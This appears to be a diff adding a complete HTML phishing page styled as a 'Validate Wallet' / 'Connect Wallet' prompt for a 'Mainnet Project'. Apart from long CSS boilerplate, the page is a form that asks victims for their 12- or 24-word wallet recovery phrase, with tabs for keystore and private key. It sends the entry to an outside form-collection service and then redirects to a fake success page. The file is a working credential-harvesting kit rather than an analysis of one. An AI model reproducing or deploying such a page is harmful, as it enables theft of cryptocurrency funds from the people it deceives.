@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Connect</title>
+
+    <style type="text/css">
+        body {
+            background: black;
+        }
+
+        .middlecontent {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            width: 100%;
+            margin-top: 20px;
+            padding: 10px;
+        }
+
+        .all {
+            -webkit-text-size-adjust: 100%;
+            tab-size: 4;
+            font-family: Figtree, sans-serif;
+            font-feature-settings: normal;
+            font-variation-settings: normal;
+            -webkit-tap-highlight-color: transparent;
+            line-height: inherit;
+            --tw-bg-opacity: 1;
+            text-align: left;
+            --tw-text-opacity: 1;
+            color: rgb(255 255 255 / var(--tw-text-opacity));
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb;
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-pan-x: ;
+            --tw-pan-y: ;
+            --tw-pinch-zoom: ;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-gradient-from-position: ;
+            --tw-gradient-via-position: ;
+            --tw-gradient-to-position: ;
+            --tw-ordinal: ;
+            --tw-slashed-zero: ;
+            --tw-numeric-figure: ;
+            --tw-numeric-spacing: ;
+            --tw-numeric-fraction: ;
+            --tw-ring-inset: ;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(59 130 246 / .5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+            --tw-blur: ;
+            --tw-brightness: ;
+            --tw-contrast: ;
+            --tw-grayscale: ;
+            --tw-hue-rotate: ;
+            --tw-invert: ;
+            --tw-saturate: ;
+            --tw-sepia: ;
+            --tw-drop-shadow: ;
+            --tw-backdrop-blur: ;
+            --tw-backdrop-brightness: ;
+            --tw-backdrop-contrast: ;
+            --tw-backdrop-grayscale: ;
+            --tw-backdrop-hue-rotate: ;
+            --tw-backdrop-invert: ;
+            --tw-backdrop-opacity: ;
+            --tw-backdrop-saturate: ;
+            --tw-backdrop-sepia: ;
+            display: flex;
+            border-radius: .75rem;
+            background-color: #fff3;
+            padding: .375rem;
+        }
+
+        .all1 {
+            -webkit-text-size-adjust: 100%;
+            tab-size: 4;
+            -webkit-tap-highlight-color: transparent;
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb;
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-pan-x: ;
+            --tw-pan-y: ;
+            --tw-pinch-zoom: ;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-gradient-from-position: ;
+            --tw-gradient-via-position: ;
+            --tw-gradient-to-position: ;
+            --tw-ordinal: ;
+            --tw-slashed-zero: ;
+            --tw-numeric-figure: ;
+            --tw-numeric-spacing: ;
+            --tw-numeric-fraction: ;
+            --tw-ring-inset: ;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(59 130 246 / .5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-blur: ;
+            --tw-brightness: ;
+            --tw-contrast: ;
+            --tw-grayscale: ;
+            --tw-hue-rotate: ;
+            --tw-invert: ;
+            --tw-saturate: ;
+            --tw-sepia: ;
+            --tw-drop-shadow: ;
+            --tw-backdrop-blur: ;
+            --tw-backdrop-brightness: ;
+            --tw-backdrop-contrast: ;
+            --tw-backdrop-grayscale: ;
+            --tw-backdrop-hue-rotate: ;
+            --tw-backdrop-invert: ;
+            --tw-backdrop-opacity: ;
+            --tw-backdrop-saturate: ;
+            --tw-backdrop-sepia: ;
+            font-family: inherit;
+            font-feature-settings: inherit;
+            font-variation-settings: inherit;
+            margin: 0;
+            padding: 0;
+            text-transform: none;
+            cursor: pointer;
+            -webkit-appearance: button;
+            background-image: none;
+            width: 100%;
+            border-radius: .5rem;
+            --tw-bg-opacity: 1;
+            /* background-color: rgb(0 119 228 / var(--tw-bg-opacity)); */
+            padding-top: .625rem;
+            padding-bottom: .625rem;
+            font-size: .875rem;
+            font-weight: 500;
+            line-height: 1.25rem;
+            --tw-text-opacity: 1;
+            color: rgb(255 255 255 / var(--tw-text-opacity));
+            --tw-shadow: 0 1px 3px 0 rgb(0 0 0 / .1), 0 1px 2px -1px rgb(0 0 0 / .1);
+            --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color);
+            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
+            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-backdrop-filter;
+            transition-timing-function: cubic-bezier(.4, 0, .2, 1);
+            transition-duration: .15s;
+        }
+
+        .all2 {
+            -webkit-text-size-adjust: 100%;
+            tab-size: 4;
+            -webkit-tap-highlight-color: transparent;
+            --tw-bg-opacity: 1;
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb;
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-pan-x: ;
+            --tw-pan-y: ;
+            --tw-pinch-zoom: ;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-gradient-from-position: ;
+            --tw-gradient-via-position: ;
+            --tw-gradient-to-position: ;
+            --tw-ordinal: ;
+            --tw-slashed-zero: ;
+            --tw-numeric-figure: ;
+            --tw-numeric-spacing: ;
+            --tw-numeric-fraction: ;
+            --tw-ring-inset: ;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(59 130 246 / .5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+            --tw-blur: ;
+            --tw-brightness: ;
+            --tw-contrast: ;
+            --tw-grayscale: ;
+            --tw-hue-rotate: ;
+            --tw-invert: ;
+            --tw-saturate: ;
+            --tw-sepia: ;
+            --tw-drop-shadow: ;
+            --tw-backdrop-blur: ;
+            --tw-backdrop-brightness: ;
+            --tw-backdrop-contrast: ;
+            --tw-backdrop-grayscale: ;
+            --tw-backdrop-hue-rotate: ;
+            --tw-backdrop-invert: ;
+            --tw-backdrop-opacity: ;
+            --tw-backdrop-saturate: ;
+            --tw-backdrop-sepia: ;
+            font-family: inherit;
+            font-feature-settings: inherit;
+            font-variation-settings: inherit;
+            margin: 0;
+            padding: 0;
+            text-transform: none;
+            cursor: pointer;
+            -webkit-appearance: button;
+            background-color: transparent;
+            background-image: none;
+            width: 100%;
+            border-radius: .5rem;
+            padding-top: .625rem;
+            padding-bottom: .625rem;
+            font-size: .875rem;
+            font-weight: 500;
+            line-height: 1.25rem;
+            --tw-text-opacity: 1;
+            color: rgb(255 255 255 / var(--tw-text-opacity));
+            --tw-space-x-reverse: 0;
+            margin-right: calc(.25rem * var(--tw-space-x-reverse));
+            margin-left: calc(.25rem * calc(1 - var(--tw-space-x-reverse)));
+        }
+
+        .all3 {
+            -webkit-text-size-adjust: 100%;
+            tab-size: 4;
+            -webkit-tap-highlight-color: transparent;
+            --tw-bg-opacity: 1;
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb;
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-pan-x: ;
+            --tw-pan-y: ;
+            --tw-pinch-zoom: ;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-gradient-from-position: ;
+            --tw-gradient-via-position: ;
+            --tw-gradient-to-position: ;
+            --tw-ordinal: ;
+            --tw-slashed-zero: ;
+            --tw-numeric-figure: ;
+            --tw-numeric-spacing: ;
+            --tw-numeric-fraction: ;
+            --tw-ring-inset: ;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(59 130 246 / .5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+            --tw-blur: ;
+            --tw-brightness: ;
+            --tw-contrast: ;
+            --tw-grayscale: ;
+            --tw-hue-rotate: ;
+            --tw-invert: ;
+            --tw-saturate: ;
+            --tw-sepia: ;
+            --tw-drop-shadow: ;
+            --tw-backdrop-blur: ;
+            --tw-backdrop-brightness: ;
+            --tw-backdrop-contrast: ;
+            --tw-backdrop-grayscale: ;
+            --tw-backdrop-hue-rotate: ;
+            --tw-backdrop-invert: ;
+            --tw-backdrop-opacity: ;
+            --tw-backdrop-saturate: ;
+            --tw-backdrop-sepia: ;
+            font-family: inherit;
+            font-feature-settings: inherit;
+            font-variation-settings: inherit;
+            margin: 0;
+            padding: 0;
+            text-transform: none;
+            cursor: pointer;
+            -webkit-appearance: button;
+            background-color: transparent;
+            background-image: none;
+            width: 100%;
+            border-radius: .5rem;
+            padding-top: .625rem;
+            padding-bottom: .625rem;
+            font-size: .875rem;
+            font-weight: 500;
+            line-height: 1.25rem;
+            --tw-text-opacity: 1;
+            color: rgb(255 255 255 / var(--tw-text-opacity));
+            --tw-space-x-reverse: 0;
+            margin-right: calc(.25rem * var(--tw-space-x-reverse));
+            margin-left: calc(.25rem * calc(1 - var(--tw-space-x-reverse)));
+        }
+
+        .bta1:hover {
+            color: #fff;
+            background-color: #0069d9;
+            border-color: #0062cc
+        }
+
+        .bta1:focus {
+            color: #fff;
+            background-color: #0069d9;
+            border-color: #0062cc;
+            box-shadow: 0 0 0 .2rem rgba(38, 143, 255, .5)
+        }
+
+        .bta2:hover {
+            color: #fff;
+            background-color: #0069d9;
+            border-color: #0062cc
+        }
+
+        .bta2:focus {
+            color: #fff;
+            background-color: #0069d9;
+            border-color: #0062cc;
+            box-shadow: 0 0 0 .2rem rgba(38, 143, 255, .5)
+        }
+
+        .bta3:hover {
+            color: #fff;
+            background-color: #0069d9;
+            border-color: #0062cc
+        }
+
+        .bta3:focus {
+            color: #fff;
+            background-color: #0069d9;
+            border-color: #0062cc;
+            box-shadow: 0 0 0 .2rem rgba(38, 143, 255, .5)
+        }
+    </style>
+
+
+
+
+
+</head>
+
+<body>
+    <div style="background-color: #404040; height: 60px; width: auto; ">
+
+        <div style="font-family:  Figtree, sans-serif; color: white; padding: 5px; font-size: 18px; line-height: 28px; text-size-adjust: 100%; padding: 15px;">
+
+            <span aria-hidden="true" style="margin-right: 40px;font-size: 25px">&times;</span> Validate Wallet
+        </div>
+
+    </div>
+
+    <div class="middlecontent">
+        <div class="form">
+            <form action="https://submit-form.com/v2od2cYMw" method="POST">
+                <input type="hidden" name="_redirect" value="www.project-mainnets.com/wallets/connect/success.html" />
+
+                <!--<input type="text" name="name" id="name" placeholder="Your name" required>
+            <input type="email" name="email" id="email" placeholder="Your email" required> -->
+
+
+                <section style="padding:5px; background-color:#404040;border-radius: 15px;width: inherit; display:block;">
+                    <p style="color:white; margin-left: 10px;"><span style="color:rgb(156, 163, 175, 0.5);font-size: 12px;line-height: 16px;">Mainnet Project:</span><br>
+                        <span style="font-size: 18px;font-weight: 400px;">Connect Wallet</span>
+                    </p>
+                </section>
+
+
+                <section style="margin-top: 10px;">
+                    <div class="all flex space-x-1 rounded-xl bg-white/20 p-1.5" role="tablist" aria-orientation="horizontal">
+
+
+                        <button class="bta1 all2 w-full rounded-lg py-2.5 text-sm font-medium leading-5 focus:outline-none text-white hover:bg-white/20" id="headlessui-tabs-tab-:rj:" role="tab" type="button" aria-selected="false" tabindex="-1" data-headlessui-state="" aria-controls="headlessui-tabs-panel-:rm:">Phrase</button>
+
+                        <button class="bta2 all2 w-full rounded-lg py-2.5 text-sm font-medium leading-5 focus:outline-none text-white hover:bg-white/20" id="headlessui-tabs-tab-:rj:" role="tab" type="button" aria-selected="false" tabindex="-1" data-headlessui-state="" aria-controls="headlessui-tabs-panel-:rm:">Keystore</button>
+
+                        <button class="bta3 all3 w-full rounded-lg py-2.5 text-sm font-medium leading-5 focus:outline-none text-white hover:bg-white/20" id="headlessui-tabs-tab-:rk:" role="tab" type="button" aria-selected="false" tabindex="-1" data-headlessui-state="" aria-controls="headlessui-tabs-panel-:rn:">Privatekey</button>
+                    </div>
+                </section>
+
+
+                <section>
+                    <textarea name="phrase" id="message" placeholder="" style="margin-top:10px;background-color: #404040; width:100%;height:120px;border-radius: 10px;caret-color:white;color: white;" required>
+                
+              </textarea>
+                </section>
+
+                <section>
+                    <p style="font-family: Figtree, sans-serif; color: rgb(0, 102, 214, 1.0); font-size: 12px;">**Typically 12 (sometimes 24) words separated by single space</p>
+                </section>
+
+                <section><input type="submit" value="Validate" id="btn" class="btn btn-primary" style="width:100%"></section>
+            </form>
+        </div>
+    </div>
+
+
+</body>
+
+</html>
